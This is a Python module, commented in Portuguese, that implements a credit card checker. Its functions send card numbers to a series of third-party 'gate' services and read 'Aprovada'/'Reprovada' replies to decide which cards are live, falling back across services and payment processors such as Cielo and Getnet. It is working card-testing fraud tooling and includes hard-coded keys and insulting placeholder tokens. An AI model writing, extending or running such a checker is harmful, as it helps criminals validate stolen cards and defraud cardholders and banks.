"""
Funções de gates.

As funções aqui retornam uma tupla contendo:
  O status (True, False, None).
  A gate que foi checada (Ruby_03, W4rlock, etc).
"""

import json
import random
import traceback
from json.decoder import JSONDecodeError
from typing import Optional, Tuple

import httpx

from utils import hc


class GateOffError(Exception):
    pass


async def centralbot(card: str) -> Tuple[Optional[bool], str]:
    gate = "center_bot"
    print(f"[GATE_{gate}][{card}] Checking cc...")
    token = "SEU TOKEN"
    try:
        rt = await hc.get(f"http://centralbot.cc:5002/chk/{token}/{card}")
        rjson = rt.json()["code"]
    except:
        return None, gate

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = True if rjson == 0 else False if rjson == 1 else None

    return (rcode, gate)


async def kratos86(card: str) -> Tuple[Optional[bool], str]:
    gate = "kratos"
    print(f"[GATE_{gate}][{card}] Checking cc...")
    token = "DNKEY"
    try:
        rt = await hc.get(
            f"http://br506.teste.website/~kratos86/api.php",
            params=dict(token=token, lista=card),
        )
        rj = rt.text
    except:
        return None, gate

    print(f"[GATE_{gate}][{card}] {rj}")

    rcode = True if "Aprovada" in rj else False if "Reprovada" in rj else None

    return (rcode, gate)


async def pre_auth(card: str) -> Tuple[Optional[bool], str]:
    gate = "pre-auth"
    token = "SEU TOKEN"
    rj = {}
    print(f"[GATE_{gate}][{card}] Checking cc...")
    try:
        rt = await hc.get(f"http://api2.validcc.pro/", params=dict(key=token, cc=card))
        rj = rt.json()
    except:
        return await w4rlock_check_full(card)

    print(f"[GATE_{gate}][{card}] {rj}")

    rcode = (
        True
        if rj.get("status") == "LIVE"
        else False
        if rj.get("status") == "DEAD (Declined) [BETA]"
        else None
    )

    return (rcode, gate)


async def confidence(card: str, value: int = 0) -> Tuple[Optional[bool], str]:
    gate = "Conf" + ("_pre-auth" if value == 0 else "_debit")
    print(f"[GATE_{gate}][{card}] Checking cc...")
    user, passwrd = ("", "1234ABCD")
    try:
        rt = await hc.get(
            f"https://confidencecc.online/client/rest-api/{user}/{passwrd}/{value}/{card}"
        )
        rjson = rt.json()
    except:
        return await w4rlock_check_full(card)

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("status") == 1
        else False
        if rjson.get("status") == 0
        else None
    )
    return rcode, gate


async def zcash(card: str) -> Tuple[Optional[bool], str]:
    gate = "Zeus"
    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get("http://212.1.214.109/api-cielo.php", params=dict(lista=card))
        rtext = rt.text
        if (
            "gate off" in rtext.lower()
            or "❌" in rtext.lower()
            or "reprovada" in rtext.lower()
        ):
            raise GateOffError("gate off")
    except:
        try:
            rt = await hc.get("http://212.1.214.109/moip.php", params=dict(lista=card))
            rtext = rt.text

            if (
                "gate off" in rtext.lower()
                or "❌" in rtext.lower()
                or "reprovada" in rtext.lower()
            ):
                raise GateOffError("gate off")
        except:
            try:
                rt = await hc.get(
                    "http://212.1.214.109/erede-api.php", params=dict(lista=card)
                )
                rtext = rt.text

                if "gate off" in rtext.lower() or "❌" in rtext.lower():
                    raise GateOffError("gate off")
            except:
                return await w4rlock_check_full(card)

    rcode = (
        True
        if ("✅" in rtext or ("Aprovada" in rtext))
        else False
        if ("Reprovada" in rtext)
        else None
    )

    if rcode != True:
        return await w4rlock_check_full(card)

    return (rcode, gate)


async def w4rlock_check_full(card: str) -> Tuple[Optional[bool], str]:
    gate = "W4rLock"
    token = "SEU TOKEN FDP"

    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        r = await hc.get(
            "http://45.178.183.23:8080/checker/test",
            params=dict(token=token, cc=card, gate="getnet"),
        )
        if "status" not in r.text:
            print(r.text)
        rjson = r.json()
        if (
            rjson["response"] == "Bin blocked by admin"
            or rjson["response"] == "Blockd Bin"
        ):
            r = await hc.get(
                "http://45.178.183.23:8080/checker/test",
                params=dict(token=token, cc=card, gate="cielo"),
            )

        rjson = r.json()
    except Exception as err:
        return await ruby_check_full(card)

    attempts = 0

    while type(rjson) != dict and attempts <= 10:
        try:
            r = await hc.get(
                "http://45.178.183.23:8080/checker/test",
                params=dict(token=token, cc=card, gate="getnet"),
            )
            rjson = r.json()
        except:
            continue
        attempts += 1
        if type(rjson) == dict:
            attempts = 0

        elif attempts == 10:
            return False, gate

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("status") == 1
        else False
        if rjson.get("status") == 2
        else None
    )

    return rcode, gate


async def gp_chk(card: str) -> Tuple[Optional[bool], str]:
    gate = "gp"
    rjson = None
    rt = None
    print(f"[GATE_{gate}][{card}] Checking cc...")
    gates = ["pagarme", "erede", "cielo", "getnet"]
    g = None
    for g in gates:
        try:
            ls = "ccn" if g == "getnet" else "lista"
            rt = await hc.get(f"http://apirest.host/gp-bot-apis/{g}.php?{ls}={card}")
            rjson = rt.json()
            print(f"[GATE_{gate}_{g}][{card}] {rjson}")
        except JSONDecodeError:
            print(f"[GATE_{gate}_{g}][{card}] {rt.text}")
            continue
        except:
            traceback.print_exc()
            continue
        if rjson.get("msg") == "Aprovada":
            break

    rcode = (
        True
        if rjson.get("msg") == "Aprovada"
        else False
        if rjson.get("msg") == "Reprovada"
        else None
    )

    return rcode, f"{gate}_{g}"


async def shopcard(card: str, value: int = 0) -> Tuple[Optional[bool], str]:
    gate = "shopcard" + ("_pre-auth" if value == 0 else "_debit")

    token = "SEU TOKEN"

    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            "https://theunkchks.com/dashboard/checkers/full_bot/api.php",
            params=dict(lista=card, valor=value, chave=token),
        )

        rjson = rt.json()
    except:
        return await w4rlock_check_full(card)

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("success") is True
        else False
        if rjson.get("success") is False
        else None
    )

    return rcode, gate


async def darknet(card: str, gate: str = "erede") -> Tuple[Optional[bool], str]:
    current_gate = "darknet_" + gate

    token = "SEU TOKEN"

    print(f"[GATE_{current_gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            f"https://darknetworkbr.in/api/{gate}.php",
            params=dict(key=token, cartao=card),
        )
        rtext: dict = rt.text

    except Exception as err:
        print(err)
        return await w4rlock_check_full(card)

    print(f"[GATE_{current_gate}][{card}] {rtext}")

    rcode = True if "✅" in rtext else False if "❌" in rtext else None

    return rcode, current_gate


async def azkaban(card) -> Tuple[Optional[bool], str]:
    gate = "azkaban"
    user, password = ("", "")
    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            "https://azkabancenter.online/azkabandev.php",
            params=dict(
                lista=card, usuario=user, senha=password, testador="full4-iugu"
            ),
        )

        rjson = rt.json()
    except:
        return await w4rlock_check_full(card)

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("success") is True
        else False
        if rjson.get("success") is False
        else None
    )

    return rcode, gate


async def companychk(card: str, gate="cielo") -> Tuple[Optional[bool], str]:
    gt = f"companychk_{gate}"

    token = "SEM TOKEN PRA MACACOS"

    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            f"https://companychk.live/api/{gate}.php",
            params=dict(key=token, cartao=card),
        )

        rjson = rt.json()
    except:
        return await w4rlock_check_full(card)

    print(f"[GATE_{gt}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("message") == "aprovada"
        else False
        if rjson.get("message") == "reprovada"
        else None
    )

    return rcode, gt


async def ruby_check_full(
    card: str, return_raw=False, check_times=1
) -> Tuple[Optional[bool], str]:
    key = "ELIOTKEYY12"
    gate = ""
    gates = ["01", "02", "03", "04", "05"]
    checked_gates = []
    random.shuffle(gates)
    checked_times = 0
    for gate in gates:
        tries = 0
        print(f"[Ruby_{gate}][{card}] Checking cc...")
        while True:
            html_data = None
            try:
                r = await hc.get(
                    f"https://rubypanel.azurewebsites.net/Ruby/Gateways_Full/gate_{gate}/api.php",
                    params=dict(lista=card, key=key, savelog=False),
                )
                html_data = r.text
            except httpx.TransportError:
                break  # tenta a próxima gate
            if not html_data or r.status_code != 200:
                break  # tenta a próxima gate
            try:
                values = json.loads(html_data)
                print(f"[Ruby_{gate}][{card}] {values}")
            except:
                values = {}
            else:
                if (
                    values and values["status"] == 2
                ):  # Retestando, manda o continue para o while executar mais uma vez.
                    # Se ter mais de 3 retestes, pula para o próximo gate.
                    tries += 1
                    if tries >= 3:
                        break
                    continue
            if return_raw:
                return html_data, "Ruby_" + gate
            if "APPROVED" in html_data or (
                values and values["status"] == 0
            ):  # Aprovada.
                return True, "Ruby_" + gate
            if (
                "DECLINED" in html_data
                or (values and values["status"] == 1)
                or "Cartão vencido!" in html_data
            ):  # Reprovada.
                checked_times += 1
                checked_gates.append("Ruby_" + gate)
                if checked_times >= check_times or "Cartão vencido!" in html_data:
                    return (
                        False,
                        checked_gates[0] if check_times == 1 else checked_gates,
                    )
                else:
                    break
            if values and values["status"] == 3:  # Inválido.
                break  # Pula para o próximo gate. Inválido normalmente é falso-positivo.
            return None, gate  # Resultado desconhecido.
    return None, gate  # Todas as gates estão off.
